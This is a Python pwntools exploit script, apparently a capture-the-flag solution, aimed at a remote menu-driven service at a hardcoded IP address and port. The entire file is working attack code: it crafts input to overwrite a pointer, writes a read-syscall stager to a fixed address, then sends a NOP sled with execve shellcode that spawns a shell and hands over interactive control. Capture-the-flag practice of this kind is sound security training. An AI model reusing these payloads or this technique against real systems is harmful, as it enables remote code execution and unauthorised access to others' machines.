#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwnpwnpwn import *
from pwn import *

#host = "10.211.55.6"
#port = 8888
host = "128.199.135.210"
port = 31334
r = remote(host,port)

def mkskin(t,name):
    r.recvuntil(">")
    r.sendline(str(t))
    r.recvuntil("?")
    r.sendline(name)

def editskin(idx,skin):
    r.recvuntil(">")
    r.sendline("1")
    r.recvuntil(">")
    r.sendline(str(idx))
    r.recvuntil(":")
    r.sendline(skin)

sc = asm("""
    xor rax,rax
    mov rdx,0x50
    mov rsi,0x601d60
    syscall
""",arch = "amd64")

num = 5
r.recvuntil(":")
r.sendline(p64(4)*0x7 + "\x00" + p64(4)*7 + "\x00" + p64(4)*14 +"\x00" + p64(4)*28 )
r.recvuntil("]")
r.sendline("y")
r.recvuntil("control?")
r.recvuntil(">")
r.sendline(str(num))
mkskin(6,"A")
mkskin(6,"B")
mkskin(6,"C")
mkskin(6,"D")
mkskin(6,"E")
r.recvuntil(">")
r.sendline("2")
r.recvuntil(">")
r.sendline("2")
r.recvuntil(">")
r.sendline("2")
r.recvuntil(">")
r.sendline("2")
editskin(3,"a"*0x20)
editskin(4,"a"*0x10 + p64(0x000000000601d58))
editskin(4,p64(0x000000000601d60) + sc)
sc = "\x90"*0x20 + "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
r.recvuntil(">")
r.sendline("4")
r.sendline(sc)
r.interactive()
